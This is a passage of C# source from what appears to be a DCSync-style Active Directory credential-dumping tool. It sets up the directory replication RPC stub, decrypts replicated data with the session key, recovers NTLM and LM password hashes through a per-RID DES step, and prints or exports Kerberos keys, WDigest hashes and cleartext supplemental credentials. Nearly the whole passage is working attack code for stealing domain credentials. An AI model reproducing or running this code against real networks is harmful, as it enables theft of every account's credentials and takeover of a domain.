                0x4369E96A, 0x346ED9FC, 0xAD678846, 0xDA60B8D0,
                0x44042D73, 0x33031DE5, 0xAA0A4C5F, 0xDD0D7CC9,
                0x5005713C, 0x270241AA, 0xBE0B1010, 0xC90C2086,
                0x5768B525, 0x206F85B3, 0xB966D409, 0xCE61E49F,
                0x5EDEF90E, 0x29D9C998, 0xB0D09822, 0xC7D7A8B4,
                0x59B33D17, 0x2EB40D81, 0xB7BD5C3B, 0xC0BA6CAD,

                0xEDB88320, 0x9ABFB3B6, 0x03B6E20C, 0x74B1D29A,
                0xEAD54739, 0x9DD277AF, 0x04DB2615, 0x73DC1683,
                0xE3630B12, 0x94643B84, 0x0D6D6A3E, 0x7A6A5AA8,
                0xE40ECF0B, 0x9309FF9D, 0x0A00AE27, 0x7D079EB1,
                0xF00F9344, 0x8708A3D2, 0x1E01F268, 0x6906C2FE,
                0xF762575D, 0x806567CB, 0x196C3671, 0x6E6B06E7,
                0xFED41B76, 0x89D32BE0, 0x10DA7A5A, 0x67DD4ACC,
                0xF9B9DF6F, 0x8EBEEFF9, 0x17B7BE43, 0x60B08ED5,
                0xD6D6A3E8, 0xA1D1937E, 0x38D8C2C4, 0x4FDFF252,
                0xD1BB67F1, 0xA6BC5767, 0x3FB506DD, 0x48B2364B,
                0xD80D2BDA, 0xAF0A1B4C, 0x36034AF6, 0x41047A60,
                0xDF60EFC3, 0xA867DF55, 0x316E8EEF, 0x4669BE79,
                0xCB61B38C, 0xBC66831A, 0x256FD2A0, 0x5268E236,
                0xCC0C7795, 0xBB0B4703, 0x220216B9, 0x5505262F,
                0xC5BA3BBE, 0xB2BD0B28, 0x2BB45A92, 0x5CB36A04,
                0xC2D7FFA7, 0xB5D0CF31, 0x2CD99E8B, 0x5BDEAE1D,

                0x9B64C2B0, 0xEC63F226, 0x756AA39C, 0x026D930A,
                0x9C0906A9, 0xEB0E363F, 0x72076785, 0x05005713,
                0x95BF4A82, 0xE2B87A14, 0x7BB12BAE, 0x0CB61B38,
                0x92D28E9B, 0xE5D5BE0D, 0x7CDCEFB7, 0x0BDBDF21,
                0x86D3D2D4, 0xF1D4E242, 0x68DDB3F8, 0x1FDA836E,
                0x81BE16CD, 0xF6B9265B, 0x6FB077E1, 0x18B74777,
                0x88085AE6, 0xFF0F6A70, 0x66063BCA, 0x11010B5C,
                0x8F659EFF, 0xF862AE69, 0x616BFFD3, 0x166CCF45,
                0xA00AE278, 0xD70DD2EE, 0x4E048354, 0x3903B3C2,
                0xA7672661, 0xD06016F7, 0x4969474D, 0x3E6E77DB,
                0xAED16A4A, 0xD9D65ADC, 0x40DF0B66, 0x37D83BF0,
                0xA9BCAE53, 0xDEBB9EC5, 0x47B2CF7F, 0x30B5FFE9,
                0xBDBDF21C, 0xCABAC28A, 0x53B39330, 0x24B4A3A6,
                0xBAD03605, 0xCDD70693, 0x54DE5729, 0x23D967BF,
                0xB3667A2E, 0xC4614AB8, 0x5D681B02, 0x2A6F2B94,
                0xB40BBE37, 0xC30C8EA1, 0x5A05DF1B, 0x2D02EF8D,
        };

        private static uint CalcCrc32(byte[] data)
        {
            uint dwCRC = 0xFFFFFFFF;
            for (int i = 0; i < data.Length; i++)
            {
                dwCRC = (dwCRC >> 8) ^ dwCrc32Table[(data[i]) ^ (dwCRC & 0x000000FF)];
            }
            dwCRC = ~dwCRC;
            return dwCRC;
        }

        private static byte[] DecryptReplicationData(byte[] data)
        {
            if (data.Length < 16)
                return null;

            byte[] key;

            using (MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider())
            {
                md5.TransformBlock(SessionKey, 0, SessionKey.Length, SessionKey, 0);
                md5.TransformFinalBlock(data, 0, 16);
                key = md5.Hash;
            }

            byte[] todecrypt = new byte[data.Length - 16];
            Array.Copy(data, 16, todecrypt, 0, data.Length - 16);
            CRYPTO_BUFFER todecryptBuffer = GetCryptoBuffer(todecrypt);
            CRYPTO_BUFFER keyBuffer = GetCryptoBuffer(key);
            int ret = RtlEncryptDecryptRC4(ref todecryptBuffer, ref keyBuffer);
            byte[] decrypted = new byte[todecryptBuffer.Length];
            Marshal.Copy(todecryptBuffer.Buffer, decrypted, 0, decrypted.Length);
            Marshal.FreeHGlobal(todecryptBuffer.Buffer);
            Marshal.FreeHGlobal(keyBuffer.Buffer);
            byte[] output = new byte[decrypted.Length - 4];
            Array.Copy(decrypted, 4, output, 0, decrypted.Length - 4);
            uint crc = CalcCrc32(output);
            uint expectedCrc = BitConverter.ToUInt32(decrypted, 0);
            if (crc != expectedCrc)
                return null;
            return output;
        }

        private static void DecodeReplicationFields(Dictionary<int, object> ReplicationData, out Dictionary<string, object> DecodedReplicationData)
        {
            DecodedReplicationData = new Dictionary<string, object>();

            foreach (ATT att in Enum.GetValues(typeof(ATT)))
            {
                if (ReplicationData.ContainsKey((int)att))
                {
                    byte[] data = ReplicationData[(int)att] as byte[];
                    if (data != null)
                    {
                        DecodeData(data, att, ReplicationData, DecodedReplicationData);
                    }
                    else
                    {
                        List<byte[]> datalist = ReplicationData[(int)att] as List<byte[]>;
                        foreach (byte[] dataitem in datalist)
                        {
                            DecodeData(data, att, ReplicationData, DecodedReplicationData);
                        }
                    }
                }
            }
        }

        private static void DecodeData(byte[] data, ATT att, Dictionary<int, object> ReplicationData, Dictionary<string, object> DecodedReplicationData)
        {
            if (data != null)
            {
                switch (att)
                {
                    case ATT.ATT_WHEN_CREATED:
                    case ATT.ATT_WHEN_CHANGED:
                        //    var test = BitConverter.ToInt64(data, 0);    
                        //string stringdate = UnicodeEncoding.Default.GetString(data);
                        //    DateTime d = DateTime.ParseExact(stringdate, "yyyyMMddHHmmss.f'Z'", CultureInfo.InvariantCulture);
                        //    DecodedReplicationData.Add(att.ToString(), d);
                        break;
                    case ATT.ATT_LAST_LOGON:
                    case ATT.ATT_PWD_LAST_SET:
                    case ATT.ATT_ACCOUNT_EXPIRES:
                    case ATT.ATT_LOCKOUT_TIME:
                        Int64 intdate = BitConverter.ToInt64(data, 0);
                        DateTime datetime;
                        if (intdate == Int64.MaxValue)
                        {
                            datetime = DateTime.MaxValue;
                        }
                        else
                        {
                            datetime = DateTime.FromFileTime(intdate);
                        }
                        DecodedReplicationData.Add(att.ToString(), datetime);
                        break;
                    case ATT.ATT_RDN:
                    case ATT.ATT_SAM_ACCOUNT_NAME:
                    case ATT.ATT_USER_PRINCIPAL_NAME:
                    case ATT.ATT_SERVICE_PRINCIPAL_NAME:
                        DecodedReplicationData.Add(att.ToString(), Encoding.Unicode.GetString(data));
                        break;
                    case ATT.ATT_LOGON_WORKSTATION:
                        break;

                    case ATT.ATT_USER_ACCOUNT_CONTROL:
                        DecodedReplicationData.Add(att.ToString(), BitConverter.ToInt32(data, 0));
                        break;
                    case ATT.ATT_SAM_ACCOUNT_TYPE:
                        DecodedReplicationData.Add(att.ToString(), BitConverter.ToInt32(data, 0));
                        break;
                    case ATT.ATT_UNICODE_PWD:
                    case ATT.ATT_NT_PWD_HISTORY:
                    case ATT.ATT_DBCS_PWD:
                    case ATT.ATT_LM_PWD_HISTORY:
                        byte[] decrypted = DecryptHashUsingSID(data, ReplicationData[(int)ATT.ATT_OBJECT_SID] as byte[]);
                        DecodedReplicationData.Add(att.ToString(), decrypted);
                        break;
                    case ATT.ATT_SID_HISTORY:
                    case ATT.ATT_OBJECT_SID:
                        DecodedReplicationData.Add(att.ToString(), new SecurityIdentifier(data, 0));
                        break;
                    case ATT.ATT_SUPPLEMENTAL_CREDENTIALS:
                        DecodedReplicationData.Add(att.ToString(), data);
                        break;
                    case ATT.ATT_LOGON_HOURS:
                    default:
                        DecodedReplicationData.Add(att.ToString(), data.ToString());
                        break;
                }
            }
        }

        private static byte[] DecryptHashUsingSID(byte[] hashEncryptedWithRID, byte[] sidByteForm)
        {
            // extract the RID from the SID
            GCHandle handle = GCHandle.Alloc(sidByteForm, GCHandleType.Pinned);
            IntPtr sidIntPtr = handle.AddrOfPinnedObject();
            IntPtr SubAuthorityCountIntPtr = GetSidSubAuthorityCount(sidIntPtr);
            byte SubAuthorityCount = Marshal.ReadByte(SubAuthorityCountIntPtr);
            IntPtr SubAuthorityIntPtr = GetSidSubAuthority(sidIntPtr, (uint)SubAuthorityCount - 1);
            uint rid = (uint)Marshal.ReadInt32(SubAuthorityIntPtr);
            handle.Free();

            // Decrypt the hash
            byte[] output = new byte[16];
            IntPtr outputPtr = Marshal.AllocHGlobal(16);
            RtlDecryptDES2blocks1DWORD(hashEncryptedWithRID, ref rid, outputPtr);
            Marshal.Copy(outputPtr, output, 0, 16);
            Marshal.FreeHGlobal(outputPtr);
            return output;
        }

        public static void PrintReplicationData(Dictionary<int, object> replicationData)
        {
            Dictionary<string, object> dic;
            DecodeReplicationFields(replicationData, out dic);

            dic.TryGetValue("ATT_RDN", out object rdn);
            dic.TryGetValue("ATT_USER_ACCOUNT_CONTROL", out object uac);
            dic.TryGetValue("ATT_UNICODE_PWD", out object unicodePwd);
            dic.TryGetValue("ATT_NT_PWD_HISTORY", out object ntPwdHistory);
            dic.TryGetValue("ATT_PWD_LAST_SET", out object pwdLastSet);
            dic.TryGetValue("ATT_SUPPLEMENTAL_CREDENTIALS", out object suppCredential);
            dic.TryGetValue("ATT_OBJECT_SID", out object objectSid);
            dic.TryGetValue("ATT_ACCOUNT_EXPIRES", out object accountExp);
            dic.TryGetValue("ATT_DBCS_PWD", out object lmPwd);
            dic.TryGetValue("ATT_LM_PWD_HISTORY", out object lmPwdHistory);
            dic.TryGetValue("ATT_SAM_ACCOUNT_NAME", out object samAccountName);
            dic.TryGetValue("ATT_SAM_ACCOUNT_TYPE", out object samAccountType);
            dic.TryGetValue("ATT_SERVICE_PRINCIPAL_NAME", out object spn);
            dic.TryGetValue("ATT_USER_PRINCIPAL_NAME", out object upn);

            Console.WriteLine("[*]");
            Console.WriteLine("[*] Object RDN           : {0}", rdn);
            Console.WriteLine("[*]");
            Console.WriteLine("[*] ** SAM ACCOUNT **");
            Console.WriteLine("[*]");
            Console.WriteLine("[*] SAM Username         : {0}", samAccountName);
            Console.WriteLine("[*] User Principal Name  : {0}", upn);
            Console.WriteLine("[*] Account Type         : {0}", SamAccountTypeToString(Convert.ToUInt32(samAccountType)));
            Console.WriteLine("[*] User Account Control : {0}", UacToString(Convert.ToInt32(uac)));
            Console.WriteLine("[*] Account expiration   : {0}", accountExp);
            Console.WriteLine("[*] Password last change : {0}", pwdLastSet);
            Console.WriteLine("[*] Object Security ID   : {0}", objectSid);

            if (objectSid != null)
            {
                byte[] tmp_obj = new byte[((SecurityIdentifier)objectSid).BinaryLength];
                ((SecurityIdentifier)objectSid).GetBinaryForm(tmp_obj, 0);

                GCHandle tmp_objPinnedArray = GCHandle.Alloc(tmp_obj, GCHandleType.Pinned);
                IntPtr pobjectSid = tmp_objPinnedArray.AddrOfPinnedObject();

                IntPtr subSid = GetSidSubAuthority(pobjectSid, (uint)Marshal.ReadByte(GetSidSubAuthorityCount(pobjectSid)) - 1);

                if (subSid != IntPtr.Zero)
                {
                    uint rid = (uint)Marshal.ReadInt32(subSid);
                    Console.WriteLine("[*] Object Relative ID   : {0}", rid);
                }
            }
            Console.WriteLine("[*]");

            if (unicodePwd != null || ntPwdHistory != null || lmPwd != null || lmPwdHistory != null)
            {
                Console.WriteLine("[*] Credentials:");
                if (unicodePwd != null)
                {
                    Console.WriteLine("[*] Hash NTLM            : {0}", Utility.PrintHashBytes((byte[])unicodePwd));
                }
                if (ntPwdHistory != null)
                {
                    Console.WriteLine("[*] ntlm- 0              : {0}", Utility.PrintHashBytes((byte[])ntPwdHistory));
                }
                if (lmPwd != null)
                {
                    Console.WriteLine("[*] LM  - 0              : {0}", Utility.PrintHashBytes((byte[])lmPwd));
                }
                if (lmPwdHistory != null)
                {
                    Console.WriteLine("[*] lm  - 0              : {0}", Utility.PrintHashBytes((byte[])lmPwdHistory));
                }
                Console.WriteLine("[*]");
            }

            int offsetConunt = Utility.FieldOffset<USER_PROPERTIES>("PropertyCount");
            int offsetLenght = Utility.FieldOffset<USER_PROPERTIES>("Length");
            int offsetUserProp = Utility.FieldOffset<USER_PROPERTIES>("UserProperties");

            int offsetNameLength = Utility.FieldOffset<USER_PROPERTY>("NameLength");
            int offsetValueLength = Utility.FieldOffset<USER_PROPERTY>("ValueLength");
            int offsetName = Utility.FieldOffset<USER_PROPERTY>("PropertyName");

            int numberOfHashesOffset = Utility.FieldOffset<Module.WDigest.WDIGEST_CREDENTIALS>("NumberOfHashes");
            int hashesOffset = Utility.FieldOffset<Module.WDigest.WDIGEST_CREDENTIALS>("Hash");

            if (suppCredential != null)
            {
                int propertyConut = BitConverter.ToInt16((byte[])suppCredential, offsetConunt);

                Console.WriteLine("[*] Supplemental Credentials: ");
                Console.WriteLine("[*]");

                int readedSize = 0;
                for (int i = 0; i < propertyConut; i++)
                {
                    int nameLength = BitConverter.ToInt16((byte[])suppCredential, readedSize + offsetUserProp + offsetNameLength);
                    int valueLength = BitConverter.ToInt16((byte[])suppCredential, readedSize + offsetUserProp + offsetValueLength);

                    int valueOffset = offsetName + nameLength;

                    string propertyName = Encoding.Unicode.GetString((byte[])suppCredential, readedSize + offsetUserProp + offsetName, nameLength);

                    string propertyRawValue = Encoding.Default.GetString((byte[])suppCredential, readedSize + offsetUserProp + offsetName + nameLength, valueLength);

                    byte[] propertyValueBytes = Utility.StringToByteArray(propertyRawValue);

                    Console.WriteLine("[*]  * {0}", propertyName);

                    switch (propertyName)
                    {
                        case Packages:
                        case PrimaryCleartext:
                            {
                                Console.WriteLine("[*] \t{0}", Encoding.Unicode.GetString(propertyValueBytes));

                            }
                            break;
                        case PrimaryKerberos:
                            {
                                KERB_STORED_CREDENTIAL cred = Utility.ReadStruct<KERB_STORED_CREDENTIAL>(propertyValueBytes);

                                string dsalt = Encoding.Unicode.GetString(propertyValueBytes, (int)cred.DefaultSaltOffset, cred.DefaultSaltLength);
                                Console.WriteLine("[*] \tDefault Salt :{0}", dsalt);

                                Console.WriteLine("[*] \t{0}", "Credentials");
                                KeyDataInfo(propertyValueBytes, Marshal.SizeOf(typeof(KERB_STORED_CREDENTIAL)), cred.CredentialCount);

                                int new_start = (cred.CredentialCount * Marshal.SizeOf(typeof(KERB_KEY_DATA))) + Marshal.SizeOf(typeof(KERB_STORED_CREDENTIAL));
                                Console.WriteLine("[*] \t{0}", "OldCredentials");
                                KeyDataInfo(propertyValueBytes, new_start, cred.OldCredentialCount);
                            }
                            break;
                        case PrimaryKerberosNew:
                            {
                                KERB_STORED_CREDENTIAL_NEW cred = Utility.ReadStruct<KERB_STORED_CREDENTIAL_NEW>(propertyValueBytes);

                                string dsalt = Encoding.Unicode.GetString(propertyValueBytes, (int)cred.DefaultSaltOffset, cred.DefaultSaltLength);
                                Console.WriteLine("[*] \tDefault Salt :{0}", dsalt);

                                Console.WriteLine("[*] \t{0}", "Credentials");
                                KeyDataNewInfo(propertyValueBytes, Marshal.SizeOf(typeof(KERB_STORED_CREDENTIAL_NEW)), cred.CredentialCount);

                                int new_start = (cred.CredentialCount * Marshal.SizeOf(typeof(KERB_KEY_DATA_NEW))) + Marshal.SizeOf(typeof(KERB_STORED_CREDENTIAL_NEW));
                                Console.WriteLine("[*] \t{0}", "ServiceCredentials");
                                KeyDataNewInfo(propertyValueBytes, new_start, cred.ServiceCredentialCount);

                                new_start = (cred.ServiceCredentialCount * Marshal.SizeOf(typeof(KERB_KEY_DATA_NEW))) + new_start;
                                Console.WriteLine("[*] \t{0}", "OldCredentials");
                                KeyDataNewInfo(propertyValueBytes, new_start, cred.OldCredentialCount);

                                new_start = (cred.OldCredentialCount * Marshal.SizeOf(typeof(KERB_KEY_DATA_NEW))) + new_start;
                                Console.WriteLine("[*] \t{0}", "OlderCredentials");
                                KeyDataNewInfo(propertyValueBytes, new_start, cred.OlderCredentialCount);

                            }
                            break;
                        case PrimaryNtlmStrongNTOWF:
                            {
                                Console.WriteLine("[*] \tRandom Value : {0}", Utility.PrintHashBytes(propertyValueBytes));

                            }
                            break;
                        case PrimaryWDigest:
                            {
                                int numberOfHashes = BitConverter.ToInt16(propertyValueBytes, numberOfHashesOffset);
                                byte[] tmp_b = new byte[MD5_DIGEST_LENGTH];
                                for (int j = 0; j < numberOfHashes; j++)
                                {
                                    Array.Copy(propertyValueBytes, hashesOffset + (j * MD5_DIGEST_LENGTH), tmp_b, 0, tmp_b.Length);
                                    Console.WriteLine("[*] \t{0} {1}", (j + 1).ToString().PadLeft(2, '0'), Utility.PrintHashBytes(tmp_b));

                                }
                            }
                            break;
                        default:
                            {
                                Console.WriteLine("[*] \tUnknown data : {0}", Utility.PrintHashBytes(propertyValueBytes));

                            }
                            break;

                    }
                    Console.WriteLine("[*]");


                    readedSize += offsetName + nameLength + valueLength;
                }
            }
        }

        public static void ExportReplicationData(Dictionary<int, object> replicationData, string path)
        {
            Dictionary<string, object> dic;
            DecodeReplicationFields(replicationData, out dic);

            dic.TryGetValue("ATT_USER_ACCOUNT_CONTROL", out object uac);
            dic.TryGetValue("ATT_UNICODE_PWD", out object unicodePwd);
            dic.TryGetValue("ATT_OBJECT_SID", out object objectSid);
            dic.TryGetValue("ATT_SAM_ACCOUNT_NAME", out object samAccountName);

            if (!File.Exists(path))
                return;

            StreamWriter sw = File.AppendText(path);

            if (objectSid != null || samAccountName != null || unicodePwd != null || uac != null)
            {
                StringBuilder sb = new StringBuilder();
                sb.AppendFormat(NumberFormatInfo.InvariantInfo, "{0}\t", objectSid);
                sb.AppendFormat(NumberFormatInfo.InvariantInfo, "{0}\t", samAccountName);
                sb.AppendFormat(NumberFormatInfo.InvariantInfo, "{0}\t", Utility.PrintHashBytes((byte[])unicodePwd));
                sb.AppendFormat(NumberFormatInfo.InvariantInfo, "{0}", UacToString(Convert.ToInt32(uac)));

                sw.WriteLine(sb.ToString());
            }

            sw.Close();
        }

        private static void KeyDataInfo(byte[] data, int start, int count)
        {
            for (int k = 0; k < count; k++)
            {
                byte[] keyDataBytes = new byte[Marshal.SizeOf(typeof(KERB_KEY_DATA))];
                Array.Copy(data, (k * Marshal.SizeOf(typeof(KERB_KEY_DATA))) + start, keyDataBytes, 0, keyDataBytes.Length);
                KERB_KEY_DATA kkd = Utility.ReadStruct<KERB_KEY_DATA>(keyDataBytes);

                byte[] keybyte = new byte[kkd.KeyLength];
                Array.Copy(data, kkd.KeyOffset, keybyte, 0, keybyte.Length);
                Console.WriteLine("[*] \t{0} : {1}", KerberosTicketEtype(kkd.KeyType), Utility.PrintHashBytes(keybyte));

            }
        }

        private static void KeyDataNewInfo(byte[] data, int start, int count)
        {
            for (int k = 0; k < count; k++)
            {
                byte[] keyDataBytes = new byte[Marshal.SizeOf(typeof(KERB_KEY_DATA_NEW))];
                Array.Copy(data, (k * Marshal.SizeOf(typeof(KERB_KEY_DATA_NEW))) + start, keyDataBytes, 0, keyDataBytes.Length);
                KERB_KEY_DATA_NEW kkd = Utility.ReadStruct<KERB_KEY_DATA_NEW>(keyDataBytes);

                byte[] keybyte = new byte[kkd.KeyLength];
                Array.Copy(data, kkd.KeyOffset, keybyte, 0, keybyte.Length);
                Console.WriteLine("[*] \t{0} {1}: {2}", KerberosTicketEtype(kkd.KeyType), kkd.IterationCount, Utility.PrintHashBytes(keybyte));

            }
        }

        private static IntPtr GetStubPtr(ushort MajorVerson, ushort MinorVersion)
        {
            if (!stub.IsAllocated)
            {
                Guid interfaceID = new Guid("e3514235-4b06-11d1-ab04-00c04fc2dcd2");
                procString = GCHandle.Alloc(ms2Ddrsr__MIDL_ProcFormatString, GCHandleType.Pinned);

                Guid IID_SYNTAX = new Guid(0x8A885D04u, 0x1CEB, 0x11C9, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60);

                RPC_VERSION rpcVersionInter = new RPC_VERSION
                {
                    MajorVersion = MajorVerson,
                    MinorVersion = MinorVersion
                };

                RPC_SYNTAX_IDENTIFIER interfaceId = new RPC_SYNTAX_IDENTIFIER
                {
                    SyntaxGUID = interfaceID,
                    SyntaxVersion = rpcVersionInter
                };

                RPC_VERSION rpcVersionTSyntax = new RPC_VERSION
                {
                    MajorVersion = 2,
                    MinorVersion = 0
                };
                RPC_SYNTAX_IDENTIFIER transferSyntax = new RPC_SYNTAX_IDENTIFIER
                {
                    SyntaxGUID = IID_SYNTAX,
                    SyntaxVersion = rpcVersionTSyntax
                };

                RPC_CLIENT_INTERFACE clientinterfaceObject = new RPC_CLIENT_INTERFACE
                {
                    Length = (uint)Marshal.SizeOf(typeof(RPC_CLIENT_INTERFACE)),
                    InterfaceId = interfaceId,
                    TransferSyntax = transferSyntax,
                    DispatchTable = IntPtr.Zero,
                    RpcProtseqEndpointCount = 0u,
                    RpcProtseqEndpoint = IntPtr.Zero,
                    Reserved = IntPtr.Zero,
                    InterpreterInfo = IntPtr.Zero,
                    Flags = 0u
                };

                COMM_FAULT_OFFSETS commFaultOffset = new COMM_FAULT_OFFSETS
                {
                    CommOffset = -1,
                    FaultOffset = -1
                };

                faultoffsets = GCHandle.Alloc(commFaultOffset, GCHandleType.Pinned);
                clientinterface = GCHandle.Alloc(clientinterfaceObject, GCHandleType.Pinned);
                formatString = GCHandle.Alloc(ms2Ddrsr__MIDL_TypeFormatString, GCHandleType.Pinned);

                allocMemoryFunctionDelegate = AllocateMemory;
                freeMemoryFunctionDelegate = FreeMemory;
                IntPtr pAllocMemory = Marshal.GetFunctionPointerForDelegate(allocMemoryFunctionDelegate);
                IntPtr pFreeMemory = Marshal.GetFunctionPointerForDelegate(freeMemoryFunctionDelegate);

                MIDL_STUB_DESC stubObject = new MIDL_STUB_DESC
                {
                    pFormatTypes = formatString.AddrOfPinnedObject(),
                    RpcInterfaceInformation = clientinterface.AddrOfPinnedObject(),
                    CommFaultOffsets = IntPtr.Zero,
                    pfnAllocate = pAllocMemory,
                    pfnFree = pFreeMemory,
                    pAutoBindHandle = IntPtr.Zero,
                    apfnNdrRundownRoutines = IntPtr.Zero,
                    aGenericBindingRoutinePairs = IntPtr.Zero,
                    apfnExprEval = IntPtr.Zero,
                    aXmitQuintuple = IntPtr.Zero,
                    fCheckBounds = 1,
                    Version = 0x50002u,
                    pMallocFreeStruct = IntPtr.Zero,
                    MIDLVersion = 0x8000253,
                    aUserMarshalQuadruple = IntPtr.Zero,
                    NotifyRoutineTable = IntPtr.Zero,
                    mFlags = new IntPtr(0x00000001),
                    CsRoutineTables = IntPtr.Zero,
                    ProxyServerInfo = IntPtr.Zero,
                    pExprInfo = IntPtr.Zero,
                };

                stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);
            }

            return stub.AddrOfPinnedObject();
        }

        private static IntPtr GetProcStringPtr(int index)
        {
            return Marshal.UnsafeAddrOfPinnedArrayElement(ms2Ddrsr__MIDL_ProcFormatString, index);
        }

        private static IntPtr AllocateMemory(int size)
        {
            IntPtr memory = Marshal.AllocHGlobal(size);
            return memory;
        }

        private static void FreeMemory(IntPtr memory)
        {
            Marshal.FreeHGlobal(memory);
        }

        private static CRYPTO_BUFFER GetCryptoBuffer(byte[] bytes)
        {
            CRYPTO_BUFFER cpb = new CRYPTO_BUFFER();
            cpb.Length = cpb.MaximumLength = (uint)bytes.Length;
            cpb.Buffer = Marshal.AllocHGlobal(bytes.Length);
            Marshal.Copy(bytes, 0, cpb.Buffer, bytes.Length);
            return cpb;
        }

        private static string SamAccountTypeToString(uint accountType)
        {
            SamAccountType sat = (SamAccountType)accountType;
            return sat.ToString();
        }

        private static string UacToString(int uac)
        {
            UserAccountControl userAccountControl = (UserAccountControl)uac;
            return userAccountControl.ToString();
        }
    }
}
